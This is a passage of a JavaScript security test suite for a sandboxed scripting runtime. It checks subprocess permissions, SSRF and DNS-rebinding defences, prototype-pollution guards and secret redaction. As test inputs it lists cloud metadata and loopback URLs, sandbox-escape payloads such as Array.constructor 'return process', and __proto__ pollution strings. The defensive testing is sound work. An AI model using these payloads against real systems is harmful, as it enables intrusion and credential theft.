 function createMockElement(tag) {
  return {
   tag,
   nodeType: 1,
   style: {},
   attributes: {},
   children: [],
   listeners: {},
   textContent: '',
   value: '',
   className: '',
   hidden: false,
   disabled: false,
   setAttribute(k, v) { this.attributes[k] = v },
   removeAttribute(k) { delete this.attributes[k] },
   appendChild(c) { this.children.push(c); return c },
   insertBefore(c, r) {
    const i = this.children.indexOf(r)
    if (i === -1) this.children.push(c)
    else this.children.splice(i, 0, c)
    return c
   },
   replaceChildren(...nodes) { this.children = [...nodes] },
   addEventListener(e, h) { this.listeners[e] = h },
   removeEventListener(e, h) { if (this.listeners[e] === h) delete this.listeners[e] },
   focus() {},
   remove() {},
  }
 }

 const kv = new Map()
 function makeKv(prefix = '') {
  const q = k => (prefix ? `${prefix}.${k}` : k)
  return {
   namespace: n => makeKv(q(n)),
   async get(k) { return kv.has(q(k)) ? kv.get(q(k)) : null },
   async set(k, v) { kv.set(q(k), v) },
   async delete(k) { kv.delete(q(k)) },
  }
 }

 function makeWebStorage() {
  const m = new Map()
  return {
   getItem(k) { return m.has(k) ? m.get(k) : null },
   setItem(k, v) { m.set(k, String(v)) },
   removeItem(k) { m.delete(k) },
  }
 }

 let uuid = 0
 const mockWindow = {
  Array,
  Boolean,
  Date,
  JSON,
  Math,
  Number,
  Object,
  Reflect,
  decodeURIComponent,
  crypto: { randomUUID: () => `iso-uuid-${++uuid}` },
  history: { pushState(_s, _t, url) { mockWindow.location.pathname = url } },
  location: { pathname: '/', origin: 'http://localhost:8080', search: '', hash: '' },
  localStorage: makeWebStorage(),
  sessionStorage: makeWebStorage(),
  fetch: () => new Promise(() => {}),
  addEventListener() {},
  removeEventListener() {},
 }
 const mockDocument = {
  body: createMockElement('body'),
  documentElement: createMockElement('html'),
  defaultView: mockWindow,
  createElement: createMockElement,
 }

 const origFetch = globalThis.fetch
 globalThis.fetch = async url => {
  const map = {
   '/src/lane-control.fs': laneSource,
   '/src/lane-notebook.fs': notebookSource,
   '/src/lane-inputs.fs': inputsSource,
   '/src/lane-scope.fs': scopeSource,
   '/src/lane-data.fs': dataSource,
   '/src/confirm-modal.fs': confirmModalSource,
   '/src/lane-row-picker-modal.fs': rowPickerModalSource,
   '/src/lane-output.fs': outputSource,
   '/src/lane-modal.fs': modalSource,
   '/src/lane-config-modal.fs': configModalSource,
   '/src/lane-import-modal.fs': importModalSource,
   '/src/lane-rails.fs': railsSource,
   '/src/lane-line-info-modal.fs': lineInfoModalSource,
   '/src/lane-export-modal.fs': exportModalSource,
   '/src/lane-export-deploy-modal.fs': exportDeployModalSource,
   '/src/lane-server.fs': laneServerSource,
   '/src/lane-story.fs': laneStorySource,
   '/src/lane-servers-modal.fs': laneServersModalSource,
   '/src/lane-terminal-modal.fs': laneTerminalModalSource,
   '/src/lane-session-modal.fs': sessionModalSource,
   '/src/lane-package-modal.fs': packageModalSource,
   '/src/lane-dir-modal.fs': dirModalSource,
  }
  if (Object.hasOwn(map, url)) {
   return { ok: true, text: async () => map[url] }
  }
  throw new Error(`Unexpected fetch: ${url}`)
 }

 try {
  const f = field({
   ...DATA_RUNTIME_ENV,
   console: { log() {} },
   createIdleTracker,
   createSandboxedOutputHost,
   createSourceWorkerRunner: opts => createSourceWorkerRunner({ ...opts, timeoutMs: 60 }),
   data: makeKv(),
   defaultValueForType,
   document: mockDocument,
   formatImportLine,
   hasImportCycle,
   normalizePrimitiveType,
   parseImportLine,
   primitiveTypes: PRIMITIVE_TYPES,
   resolveImportValue,
   resolveScopeColumns,
   runLines: runLinesInWorker,
   window: mockWindow,
  })
  await f.run(parse(mainSource, '/src/main.fs'))
  const lc = f.state['lane-control']
  const firstSessionId = lc['session-id']
  assert.ok(firstSessionId)
  assert.equal(lc['session-status-pending'], false, 'Startup must settle session-status-pending to false')
  assert.equal(await lc['is-session-navigation-blocked'](), false)

  await f.state.tableHeadRowAddButton.listeners.click()

  const lane = f.state.lanes[0]
  const nb = lane.notebook

  // Hang on external fetch -> Worker hard-terminates after 60ms, shows error preview, and notebook returns to idle
  nb.rows[0]['input-el'].value = "; to never !fetch 'https://slow.example.test/hang'"
  await nb.rows[0]['input-el'].listeners.input()
  await nb['when-idle']()
  assert.equal(nb['is-running'](), false)
  assert.match(nb.rows[0]['preview-el'].textContent, /timed out after 60ms \(worker terminated\)/)
  assert.match(nb.rows[0]['preview-el'].className, /lane-line-preview--error/)

  // Fix line -> evaluates cleanly in a fresh Worker with sandboxed Lane Output
  nb.rows[0]['input-el'].value = "; send ( ; to d !document.createElement div , ; set 'Session 1 Output' d.textContent , $d )"
  await nb.rows[0]['input-el'].listeners.input()
  await nb['when-idle']()
  assert.equal(nb.rows[0]['error'], undefined)
  assert.equal(nb['output-view']['iframe-el'].attributes.sandbox, 'allow-scripts')

  // Save session 1 draft, create session 2, add lane in session 2, save, and switch back & forth
  await lc['confirm-session-data-dir'](null)
  await lc['save-session-draft']()
  assert.equal(lc['session-status-pending'], false)
  assert.equal(await lc['is-session-navigation-blocked'](), false)

  const secondSess = await lc['new-session']('Session Two', null, true)
  const secondSessionId = secondSess.sessionId
  assert.notEqual(secondSessionId, firstSessionId)
  assert.equal(lc['session-status-pending'], false)
  assert.equal(await lc['is-session-navigation-blocked'](), false)
  assert.equal(f.state.lanes.length, 0)

  await f.state.tableHeadRowAddButton.listeners.click()
  const lane2 = f.state.lanes[0]
  lane2.notebook.rows[0]['input-el'].value = '; add 100 23'
  await lane2.notebook.rows[0]['input-el'].listeners.input()
  assert.equal(lane2.notebook.rows[0]['preview-el'].textContent, '123')
  await lc['save-session-draft']()
  assert.equal(await lc['is-session-navigation-blocked'](), false)

  // Switch back to Session 1 -> mounts Session 1 lane, runs Worker + sandboxed iframe, and settles cleanly
  await lc['switch-session'](firstSessionId)
  assert.equal(lc['session-id'], firstSessionId)
  assert.equal(lc['session-status-pending'], false)
  assert.equal(await lc['is-session-navigation-blocked'](), false)
  assert.equal(f.state.lanes.length, 1)
  assert.equal(f.state.lanes[0].id, lane.id)

  // Switch forward to Session 2 -> mounts Session 2 lane and settles cleanly
  await lc['switch-session'](secondSessionId)
  assert.equal(lc['session-id'], secondSessionId)
  assert.equal(lc['session-status-pending'], false)
  assert.equal(await lc['is-session-navigation-blocked'](), false)
  assert.equal(f.state.lanes.length, 1)
  assert.equal(f.state.lanes[0].id, lane2.id)
  assert.equal(f.state.lanes[0].notebook.rows[0]['preview-el'].textContent, '123')

  // Closing the lane disposes both the Worker runner and the sandboxed output host
  await lc.close(lane2.id)
  await lc['save-session-draft']()
 }
 finally {
  globalThis.fetch = origFetch
 }
})

test('Backend Node --permission subprocess & SSRF network boundary (isBlockedIpAddress, validateSourceFetchUrl, createSafeExternalFetch)', async () => {
 const repoDir = fsSync.realpathSync(process.cwd())
 const fieldPath = path.join(repoDir, 'field.mjs')
 const execArgs = buildNodePermissionExecArgs([fieldPath, fieldPath], { maxOldSpaceMb: 96 })

 assert.ok(
  execArgs.includes('--permission') || execArgs.includes('--experimental-permission'),
  'Subprocess execArgs must enable Node --permission'
 )
 assert.ok(execArgs.includes('--disallow-code-generation-from-strings'))
 assert.ok(execArgs.includes('--max-old-space-size=96'))
 assert.deepEqual(
  execArgs.filter(a => a.startsWith('--allow-')),
  [`--allow-fs-read=${fieldPath}`],
  'Subprocess must grant zero write, network, child_process, worker, addon, or broad directory read permissions'
 )

 // Verify OS/C++ Node permission enforcement inside a real spawned child process
 process.env.CC_PARENT_SECRET_TOKEN = 'DO_NOT_INHERIT_ME'
 try {
  const probeReport = await new Promise((resolve, reject) => {
   const childCode = [
    'import fs from "node:fs"',
    'import cp from "node:child_process"',
    'import wt from "node:worker_threads"',
    'const out = { envKeys: Object.keys(process.env) }',
    'try { fs.readFileSync("./start") } catch (e) { out.fsReadStart = e.code }',
    'try { fs.writeFileSync("/tmp/cc-perm-probe", "x") } catch (e) { out.fsWriteTmp = e.code }',
    'try { cp.spawnSync("id") } catch (e) { out.childProc = e.code }',
    'try { new wt.Worker("1+1", { eval: true }) } catch (e) { out.workerThread = e.code }',
    'try { eval("1+1") } catch (e) { out.evalErr = e.name }',
    'try { new Function("return 1")() } catch (e) { out.fnCtorErr = e.name }',
    'try { await fetch("http://127.0.0.1:80") } catch (e) { out.netFetch = e.cause?.code || e.code || e.name }',
    'process.send(out)',
    'process.disconnect()',
   ].join('; ')
   const child = spawn(process.execPath, [...execArgs, '--input-type=module', '-e', childCode], {
    cwd: repoDir,
    env: {},
    stdio: ['ignore', 'ignore', 'pipe', 'ipc'],
   })
   child.once('error', reject)
   child.once('message', msg => resolve(msg))
  })
  assert.deepEqual(probeReport.envKeys, [])
  assert.equal(probeReport.fsReadStart, 'ERR_ACCESS_DENIED')
  assert.equal(probeReport.fsWriteTmp, 'ERR_ACCESS_DENIED')
  assert.equal(probeReport.childProc, 'ERR_ACCESS_DENIED')
  assert.equal(probeReport.workerThread, 'ERR_ACCESS_DENIED')
  assert.equal(probeReport.evalErr, 'EvalError')
  assert.equal(probeReport.fnCtorErr, 'EvalError')
  assert.equal(probeReport.netFetch, 'ERR_ACCESS_DENIED')
 }
 finally {
  delete process.env.CC_PARENT_SECRET_TOKEN
 }

 // Exhaustive IPv4, IPv6, metadata, RFC1918, CGNAT, NAT64, 6to4, and IPv4-mapped IPv6 checks
 for (const blockedIp of [
  '0.0.0.0',
  '127.0.0.1',
  '127.0.0.53',
  '127.255.255.254',
  '10.0.0.1',
  '100.64.0.1',
  '100.100.100.200',
  '169.254.169.254',
  '169.254.170.2',
  '172.16.0.1',
  '172.31.255.254',
  '192.168.1.1',
  '224.0.0.1',
  '255.255.255.255',
  '::',
  '::1',
  '0:0:0:0:0:0:0:1',
  '::ffff:127.0.0.1',
  '::ffff:169.254.169.254',
  '::ffff:7f00:1',
  '64:ff9b::a9fe:a9fe',
  '64:ff9b::7f00:1',
  '2002:7f00:0001::1',
  'fc00::1',
  'fd00:ec2::254',
  'fe80::1',
  'fe80::1%eth0',
  'ff02::1',
 ]) {
  assert.equal(isBlockedIpAddress(blockedIp), true, `Expected IP to be blocked: ${blockedIp}`)
 }
 for (const publicIp of ['1.1.1.1', '8.8.8.8', '93.184.216.34', '2606:4700:4700::1111']) {
  assert.equal(isBlockedIpAddress(publicIp), false, `Expected public IP to be allowed: ${publicIp}`)
 }

 // URL-level SSRF checks including hex/octal/decimal IPv4, metadata hostnames, and credentials
 for (const blockedUrl of [
  'http://localhost:8080/api/fs/roots',
  'http://sub.localhost/secret',
  'http://127.0.0.1:3333/?mode=disk&key=x',
  'http://0x7f000001:3333/',
  'http://2130706433/',
  'http://0177.0.0.1/',
  'http://127.1/',
  'http://0.0.0.0:8080/',
  'http://169.254.169.254/latest/meta-data/',
  'http://100.100.100.200/latest/meta-data/',
  'http://[fd00:ec2::254]/latest/user-data',
  'http://[::1]:8080/',
  'http://[::ffff:127.0.0.1]:3333/',
  'http://metadata.google.internal/computeMetadata/v1/',
  'http://instance-data/latest/meta-data/',
  'http://service.internal/admin',
  'https://user:pass@example.com/data',
 ]) {
  assert.equal(validateSourceFetchUrl(blockedUrl).ok, false, `Expected URL to be blocked: ${blockedUrl}`)
 }

 // DNS-rebinding & multi-record resolution guards in createSafeExternalFetch
 const rebindFetch = createSafeExternalFetch({
  dnsLookup: async host => {
   if (host === 'rebind-loopback.example.test') {
    return [{ address: '127.0.0.1', family: 4 }]
   }
   if (host === 'rebind-imds.example.test') {
    return [{ address: '169.254.169.254', family: 4 }]
   }
   if (host === 'mixed-records.example.test') {
    return [
     { address: '93.184.216.34', family: 4 },
     { address: '10.0.0.9', family: 4 },
    ]
   }
   if (host === 'ipv6-imds.example.test') {
    return [{ address: 'fd00:ec2::254', family: 6 }]
   }
   throw new Error(`Unexpected host: ${host}`)
  },
 })

 await assert.rejects(() => rebindFetch('https://rebind-loopback.example.test/pwn'), /Blocked SSRF fetch target/)
 await assert.rejects(() => rebindFetch('https://rebind-imds.example.test/latest/meta-data/'), /Blocked SSRF fetch target/)
 await assert.rejects(() => rebindFetch('https://mixed-records.example.test/api'), /Blocked SSRF fetch target/)
 await assert.rejects(() => rebindFetch('https://ipv6-imds.example.test/latest'), /Blocked SSRF fetch target/)

 // Verify pinned-IP lookup callback & HTTP 302 open-redirect SSRF protection
 const socketRequests = []
 const redirectFetch = createSafeExternalFetch({
  dnsLookup: async host => {
   if (host === 'public.example.test') {
    return [{ address: '93.184.216.34', family: 4 }]
   }
   if (host === 'internal-hop.example.test') {
    return [{ address: '127.0.0.1', family: 4 }]
   }
   throw new Error(`Unexpected DNS lookup: ${host}`)
  },
  httpsRequest(reqOpts, onRes) {
   socketRequests.push(reqOpts)
   let pinnedResult = null
   reqOpts.lookup(reqOpts.hostname, { all: true }, (_err, res) => { pinnedResult = res })
   assert.deepEqual(pinnedResult, [{ address: '93.184.216.34', family: 4 }], 'Socket lookup must be pinned to validated public IP')
   queueMicrotask(() => {
    const loc = reqOpts.path === '/to-imds'
     ? 'http://169.254.169.254/latest/meta-data/iam/'
     : 'https://internal-hop.example.test/admin'
    onRes({
     statusCode: 302,
     statusMessage: 'Found',
     headers: { location: loc },
     resume() {},
     on() {},
    })
   })
   return {
    setTimeout() {},
    on() {},
    write() {},
    end() {},
    destroy() {},
   }
  },
  httpRequest() {
   throw new Error('SSRF redirect target must never reach httpRequest')
  },
 })

 await assert.rejects(() => redirectFetch('https://public.example.test/to-imds'), /Blocked SSRF fetch target/)
 await assert.rejects(() => redirectFetch('https://public.example.test/to-rebind'), /Blocked SSRF fetch target/)
 assert.equal(socketRequests.length, 2, 'Only the initial public hop should open a request; both SSRF redirect hops must be blocked pre-connect')
})

test('Server-side isolation in lane-server.mjs & agentEvalLane: host isolate immunity, codegen escape block, SSRF block, secret hygiene, and CPU hang SIGKILL recovery', async () => {
 globalThis.__CC_HOST_CANARY_SECRET = 'TOP_SECRET_HOST_ISOLATE_CANARY'
 process.env.CC_HOST_ENV_CANARY = 'TOP_SECRET_HOST_ENV_CANARY'

 const mem = new Map()
 const makeKv = (ns = '') => {
  const isHash = ns.includes('#')
  const qual = k => (isHash ? (ns.endsWith('#') ? `${ns}${k}` : `${ns}/${k}`) : (ns ? `${ns}.${k}` : k))
  return {
   namespace: name => makeKv(isHash ? qual(encodeKeySegment(name)) : qual(name)),
   hashNamespace: name => makeKv(`${encodeKeySegment(name)}#`),
   withBasePath: () => rootKv,
   async get(k) { const q = qual(k); return mem.has(q) ? mem.get(q) : null },
   async set(k, v) { mem.set(qual(k), String(v)) },
   async delete(k) { mem.delete(qual(k)) },
  }
 }
 const rootKv = makeKv()
 rootKv.defaultRoot = rootKv

 let laneSrv = null
 try {
  // 1. lane-server.mjs: verify untrusted HTTP handler runs in --permission subprocess, cannot touch host globals/env/FS/codegen/SSRF, and SIGKILLs infinite CPU loops without starving /_cc/health
  const srvLaneId = 'sec-srv-lane'
  await saveLaneScript(rootKv, rootKv.namespace(srvLaneId), srvLaneId, [
   `; to get (
    ; to { req } $argv
    [ match
     { [ propertyIs '/hang' req.path ] (
      ; while { true } ( ; to spin 1 )
     ) }
     { true (
      ; to fnEscape [ ; try ( !Array.constructor 'return process' ) : 'codegen-blocked' ]
      ; to localSsrf [ ; try ( !fetch 'http://127.0.0.1:3333/?key=secret' ) : 'loopback-ssrf-blocked' ]
      ; to metaSsrf [ ; try ( !fetch 'http://169.254.169.254/latest/meta-data/' ) : 'imds-ssrf-blocked' ]
      [ object
       { hostCanary $__CC_HOST_CANARY_SECRET }
       { proc $process }
       { buf $Buffer }
       { fnEscape $fnEscape }
       { localSsrf $localSsrf }
       { metaSsrf $metaSsrf }
      ]
     ) }
    ]
   )`,
  ], null)

  laneSrv = createLaneHttpServer({
   slug: 'sec-srv-lane',
   laneId: srvLaneId,
   logRequests: false,
   autoReload: false,
   limits: {
    maxLoopIterations: 0,
    maxSteps: 0,
    maxExecutionMs: 80,
   },
  }, { kv: rootKv })

  await laneSrv.reload()
  const addr = await laneSrv.listen(0, '127.0.0.1')
  const base = `http://127.0.0.1:${addr.port}`

  const secCheck = await fetch(`${base}/probe`).then(r => r.json())
  assert.equal(secCheck.hostCanary, undefined)
  assert.equal(secCheck.proc, undefined)
  assert.equal(secCheck.buf, undefined)
  assert.equal(secCheck.fnEscape, 'codegen-blocked')
  assert.equal(secCheck.localSsrf, 'loopback-ssrf-blocked')
  assert.equal(secCheck.metaSsrf, 'imds-ssrf-blocked')

  // Trigger 100% CPU synchronous infinite loop in /hang while concurrently polling /_cc/health on the host server
  const hangPromise = fetch(`${base}/hang`)
  await new Promise(r => setTimeout(r, 15))
  const healthStart = Date.now()
  const liveHealth = await fetch(`${base}/_cc/health`).then(r => r.json())
  const healthElapsed = Date.now() - healthStart
  assert.equal(liveHealth.ok, true, 'Host /_cc/health must remain responsive while child subprocess spins on CPU')
  assert.ok(healthElapsed < 200)

  const hangResp = await hangPromise
  assert.equal(hangResp.status, 504)
  const hangBody = await hangResp.json()
  assert.match(hangBody.error, /timed out/i)

  // Immediate recovery on next request using a fresh subprocess
  const afterHang = await fetch(`${base}/probe`)
  assert.equal(afterHang.status, 200)

  // 2. agentEvalLane: isolated subprocess evaluation, secret redaction + worker teardown, SSRF block, httpSimulation isolation, and timeout recovery
  await createNewSession(rootKv, null, { name: 'Sec Eval Session', laneIds: [], dataDir: null, dataDirConfirmed: true })
  const secretPlain = 'sk_live_SUPER_SECRET_VALUE_98765'
  const created = await agentCreateLane(rootKv, {
   title: 'Untrusted Agent Lane',
   lines: [
    '; to canary $__CC_HOST_CANARY_SECRET',
    '; to codegen [ ; try ( !Array.constructor \'return 1\' ) : \'blocked-eval\' ]',
    '; to ssrf [ ; try ( !fetch \'http://169.254.169.254/latest/meta-data/\' ) : \'blocked-imds\' ]',
    '; to leakedHeader [ ; add \'Bearer \' $apiSecret ]',
    '!console.log \'Using token:\' $apiSecret',
    '; to post ( ; to { req } $argv , ; object { echoed $req.body.v } { secretLen $apiSecret.length } )',
   ],
  })
  assert.equal(created.ok, true)

  const secSetRes = await agentMutateLaneInput(rootKv, {
   laneId: created.laneId,
   action: 'set-input',
   name: 'apiSecret',
   type: 'secret',
   value: secretPlain,
  })
  assert.equal(secSetRes.ok, true)

  const evalRes = await agentEvalLane(rootKv, {
   laneId: created.laneId,
   httpRequest: {
    method: 'POST',
    path: '/test',
    headers: { 'content-type': 'application/json' },
    body: { v: 77 },
   },
  })
  assert.equal(evalRes.ok, true)
  assert.equal(evalRes.errorCount, 0)

  const scopeMap = Object.fromEntries(evalRes.scope.map(e => [e.key, e]))
  assert.equal(scopeMap.canary.value, undefined)
  assert.equal(scopeMap.codegen.value, 'blocked-eval')
  assert.equal(scopeMap.ssrf.value, 'blocked-imds')
  assert.ok(!JSON.stringify(evalRes).includes(secretPlain), 'Plaintext secret must never appear anywhere in agentEvalLane output')
  assert.ok(scopeMap.leakedHeader.value.includes(SECRET_MASK))
  assert.ok(evalRes.logs[0].message.includes(SECRET_MASK))

  // Story snapshot recorded by agentEvalLane must also redact plaintext secrets
  const stories = await queryLaneStories(rootKv, rootKv.namespace(created.laneId), created.laneId, { limit: 5 })
  assert.equal(stories.entries.length, 1)
  assert.ok(!JSON.stringify(stories).includes(secretPlain), 'Plaintext secret must never be persisted to Story records')

  assert.ok(evalRes.httpSimulation)
  assert.equal(evalRes.httpSimulation.status, 200)
  assert.deepEqual(JSON.parse(evalRes.httpSimulation.bodyText), { echoed: 77, secretLen: secretPlain.length })

  // Hung inline lines override in agentEvalLane is hard-killed via SIGKILL on timeout and recovers cleanly
  const hungEval = await agentEvalLane(rootKv, {
   laneId: created.laneId,
   lines: ['; while { true } ( ; to spin 1 )'],
   limits: { maxLoopIterations: 0, maxSteps: 0 },
   timeoutMs: 60,
  })
  assert.equal(hungEval.ok, true)
  assert.equal(hungEval.errorCount, 1)
  assert.match(hungEval.lines[0].error, /timed out after 60ms \(worker terminated\)/)

  const recoveredEval = await agentEvalLane(rootKv, {
   laneId: created.laneId,
   lines: ['; add 20 22'],
  })
  assert.equal(recoveredEval.errorCount, 0)
  assert.equal(recoveredEval.lines[0].preview, '42')
 }
 finally {
  delete globalThis.__CC_HOST_CANARY_SECRET
  delete process.env.CC_HOST_ENV_CANARY
  if (laneSrv) {
   await laneSrv.close()
  }
  disposeIdleSourceWorkers()
 }
})

test('field.mjs language runtime & prototype hardening: null-prototype scopes, forbidden property keys, Object.hasOwn + safe-method allowlists, and pollution-safe isThenable', async () => {
 assert.ok(FORBIDDEN_PROPERTY_KEYS.includes('__proto__'))
 assert.ok(FORBIDDEN_PROPERTY_KEYS.includes('constructor'))
 assert.ok(FORBIDDEN_PROPERTY_KEYS.includes('prototype'))

 // 1. Root state and nested child scopes (will, willSeries, preservePrototype, runLines, runLinesInWorker, runTransportedScripts) end at null, never Object.prototype
 const fDefault = field({ x: 10 })
 assert.equal(Object.getPrototypeOf(fDefault.state), null)

 const liveInitial = { y: 20 }
 const fPreserved = field(liveInitial, { preservePrototype: true })
 assert.equal(fPreserved.state, liveInitial, 'preservePrototype keeps exact object identity')
 assert.equal(Object.getPrototypeOf(liveInitial), null, 'preservePrototype severs Object.prototype to null')

 const capturedChildStates = []
 const probeTransport = {
  send(_block, _args, meta) {
   capturedChildStates.push(meta.state)
   return null
  },
 }
 const fClosure = field({ outerVal: 99 }, { transport: probeTransport })
 await fClosure.run(parse(`
  ; to outerFn (
   ; to midVal 5
   ; to innerFn (
    ; send ( 1 )
    ; add $outerVal $midVal
   )
   !innerFn
  )
  ; to closureSum !outerFn
  ; to inheritedToString $toString
  ; to inheritedValueOf $valueOf
  ; to inheritedHasOwn $hasOwnProperty
 `))
 assert.equal(fClosure.state.closureSum, 104)
 assert.equal(fClosure.state.inheritedToString, undefined)
 assert.equal(fClosure.state.inheritedValueOf, undefined)
 assert.equal(fClosure.state.inheritedHasOwn, undefined)
 assert.equal(capturedChildStates.length, 1)
 const innerState = capturedChildStates[0]
 const outerState = Object.getPrototypeOf(innerState)
 const rootState = Object.getPrototypeOf(outerState)
 assert.equal(rootState, fClosure.state)
 assert.equal(Object.getPrototypeOf(rootState), null, 'Nested child scope chain must terminate at null')

 const transport = createTransport()
 const fSend = field({ count: 3, Array, JSON, Math }, { transport })
 await fSend.run(parse('; send ( ; to doubled [ multiply $count 2 ] , $doubled )'))
 const transportOut = await runTransportedScripts(transport.wires())
 assert.equal(Object.getPrototypeOf(transportOut.state), null)
 assert.equal(transportOut.state.doubled, 6)

 // 2. Forbidden keys (__proto__, constructor, prototype, __defineGetter__, etc.) are explicitly rejected across get, set, to, assign, object, invoke, and resolveScopePath
 const forbiddenCases = [
  ['get __proto__', '; to v $obj.__proto__'],
  ['get constructor on Array', '; to v $Array.constructor'],
  ['get dynamic constructor', '; to k [ add con structor ] , ; to v [ get Array $k ]'],
  ['get prototype on function', '; to fn ( 1 ) , ; to v $fn.prototype'],
  ['get constructor via safe array method', '; to m $items.map , ; to v $m.constructor'],
  ['get __lookupGetter__', '; to v $obj.__lookupGetter__'],
  ['to __proto__ root', '; to __proto__ 1'],
  ['to destructuring constructor', '; to { constructor } { 1 }'],
  ['to rest prototype', '; to { ...prototype } { 1 2 }'],
  ['set nested __proto__.polluted', '; set true obj.__proto__.polluted'],
  ['set nested constructor', '; set 1 obj.constructor'],
  ['assign pair __proto__', '; assign $obj { __proto__ $other }'],
  ['assign pair constructor', '; assign $obj { constructor 1 }'],
  ['assign JSON __proto__ object', '; to evil !JSON.parse \'{"__proto__":{"polluted":true}}\' , ; assign $obj $evil'],
  ['object literal __proto__', '; object { __proto__ 1 }'],
  ['object literal prototype', '; object { prototype 1 }'],
  ['invoke Array.constructor', "!Array.constructor 'return 1'"],
  ['invoke will.constructor', "; to fn ( 1 ) , !fn.constructor 'return 1'"],
  ['invoke method.constructor', "!items.slice.constructor 'return 1'"],
  ['invoke __defineGetter__', '!obj.__defineGetter__ x ( 1 )'],
 ]

 for (const [label, line] of forbiddenCases) {
  const out = await runLines([line], {
   initialState: {
    Array,
    JSON,
    Math,
    items: ['a', 'b'],
    obj: { ok: 1 },
    other: { z: 2 },
   },
  })
  assert.ok(out.results[0].error, `Expected forbidden key rejection for: ${label}`)
  assert.match(out.results[0].error, /forbidden property/, `Expected forbidden property message for: ${label}`)
 }
 assert.equal(({}).polluted, undefined, 'Object.prototype must remain completely unpolluted')

 // 3. Object.hasOwn + explicit safe-method allowlists block inherited Object.prototype & Function.prototype access while allowing safe built-ins
 Object.prototype.__ccProtoLeak = 'leaked-from-object-proto'
 Array.prototype.__ccArrayLeak = () => 'leaked-from-array-proto'
 String.prototype.__ccStringLeak = () => 'leaked-from-string-proto'
 try {
  const safeCheck = await runLines(
   [
    '; to rec ; object { name Ada } { score 41 }',
    '; to protoToString $rec.toString',
    '; to protoHasOwn $rec.hasOwnProperty',
    '; to protoLeak $rec.__ccProtoLeak',
    '; to invokeObjToString [ ; try ( !rec.toString ) : blocked-obj-tostring ]',
    '; to invokeObjHasOwn [ ; try ( !rec.hasOwnProperty name ) : blocked-obj-hasown ]',
    '; to fn ( ; to { n } $argv , ; add $n 1 )',
    '; to fnAstLen $fn.ast.length',
    '; to fnCallProp $fn.call',
    '; to fnBindProp $fn.bind',
    '; to fnApplyCall [ ; try ( !fn.apply null { 5 } ) : blocked-fn-apply ]',
    '; to arrLeakRead $nums.__ccArrayLeak',
    '; to arrLeakCall [ ; try ( !nums.__ccArrayLeak ) : blocked-arr-leak ]',
    '; to strLeakRead $greeting.__ccStringLeak',
    '; to strLeakCall [ ; try ( !greeting.__ccStringLeak ) : blocked-str-leak ]',
    '; to mapped !nums.map ( ; to { n } $argv , ; multiply $n 2 )',
    '; to trimmed !greeting.trim',
    '; to fixedPi !pi.toFixed 2',
    '; to maxVal !Math.max 4 19 7',
    '; to parsedJson !JSON.parse \'{"valid":true}\'',
   ],
   {
    initialState: {
     JSON,
     Math,
     greeting: '  hello world  ',
     nums: [1, 2, 3],
     pi: 3.14159,
    },
   }
  )
  assert.equal(Object.getPrototypeOf(safeCheck.state), null)
  assert.equal(safeCheck.results.every(r => !r.error), true)
  assert.equal(safeCheck.state.protoToString, undefined)
  assert.equal(safeCheck.state.protoHasOwn, undefined)
  assert.equal(safeCheck.state.protoLeak, undefined)
  assert.equal(safeCheck.state.invokeObjToString, 'blocked-obj-tostring')
  assert.equal(safeCheck.state.invokeObjHasOwn, 'blocked-obj-hasown')
  assert.equal(safeCheck.state.fnAstLen, 2)
  assert.equal(safeCheck.state.fnCallProp, undefined)
  assert.equal(safeCheck.state.fnBindProp, undefined)
  assert.equal(safeCheck.state.fnApplyCall, 'blocked-fn-apply')
  assert.equal(safeCheck.state.arrLeakRead, undefined)
  assert.equal(safeCheck.state.arrLeakCall, 'blocked-arr-leak')
  assert.equal(safeCheck.state.strLeakRead, undefined)
  assert.equal(safeCheck.state.strLeakCall, 'blocked-str-leak')
  assert.deepEqual(safeCheck.state.mapped, [2, 4, 6])
  assert.equal(safeCheck.state.trimmed, 'hello world')
  assert.equal(safeCheck.state.fixedPi, '3.14')
  assert.equal(safeCheck.state.maxVal, 19)
  assert.deepEqual(safeCheck.state.parsedJson, { valid: true })

  // 4. resolveScopePath, resolveImportValue, and listScopeEntries block dangerous & Object.prototype/Function.prototype paths
  const sampleScope = {
   user: { handle: 'ada' },
   items: ['x', 'y'],
   fn: safeCheck.state.fn,
  }
  assert.equal(resolveScopePath(sampleScope, ['__proto__']).found, false)
  assert.match(resolveScopePath(sampleScope, ['__proto__']).error, /forbidden property/)
  assert.equal(resolveScopePath(sampleScope, ['user', 'constructor']).found, false)
  assert.match(resolveScopePath(sampleScope, ['user', 'constructor']).error, /forbidden property/)
  assert.equal(resolveScopePath(sampleScope, ['fn', 'prototype']).found, false)
  assert.equal(resolveScopePath(sampleScope, ['toString']).found, false)
  assert.equal(resolveScopePath(sampleScope, ['user', 'toString']).found, false)
  assert.equal(resolveScopePath(sampleScope, ['user', '__ccProtoLeak']).found, false)
  assert.equal(resolveScopePath(sampleScope, ['fn', 'call']).found, false)
  assert.deepEqual(resolveScopePath(sampleScope, ['user', 'handle']), { found: true, value: 'ada', error: null })
  assert.deepEqual(resolveScopePath(sampleScope, ['items', 'length']), { found: true, value: 2, error: null })
  assert.throws(() => resolveImportValue({ ok: true, state: sampleScope }, ['user', 'constructor']), /forbidden property/)
  assert.throws(() => resolveImportValue({ ok: true, state: sampleScope }, ['user', 'toString']), /not found/)

  const scopeKeys = listScopeEntries(sampleScope.items).map(e => e.key)
  assert.ok(!scopeKeys.includes('constructor'))
  assert.ok(!scopeKeys.includes('__proto__'))
 }
 finally {
  delete Object.prototype.__ccProtoLeak
  delete Array.prototype.__ccArrayLeak
  delete String.prototype.__ccStringLeak
 }

 // 5. isThenable ignores Object.prototype & Function.prototype pollution (both functions and throwing getters)
 let protoThenCalls = 0
 Object.defineProperty(Object.prototype, 'then', {
  configurable: true,
  writable: true,
  value(resolve) {
   protoThenCalls += 1
   resolve('hijacked-by-object-proto')
  },
 })
 Object.defineProperty(Function.prototype, 'then', {
  configurable: true,
  writable: true,
  value(resolve) {
   protoThenCalls += 1
   resolve('hijacked-by-function-proto')
  },
 })
 try {
  assert.equal(isThenable({}), false)
  assert.equal(isThenable({ a: 1 }), false)
  assert.equal(isThenable(Object.create(null)), false)
  assert.equal(isThenable(() => 1), false)
  assert.equal(isThenable(Promise.resolve(1)), true)
  assert.equal(isThenable({ then(r) { r(1) } }), true)
  class CustomDeferred {
   then(resolve) {
    resolve(77)
   }
  }
  assert.equal(isThenable(new CustomDeferred()), true)

  const pollutedRun = await runLines(
   [
    '; to data ; object { a 10 } { b 20 }',
    '; to fn ( ; add $data.a $data.b )',
    '; to picked [ match { true : !fn } ]',
    '; to asyncVal !asyncFetch',
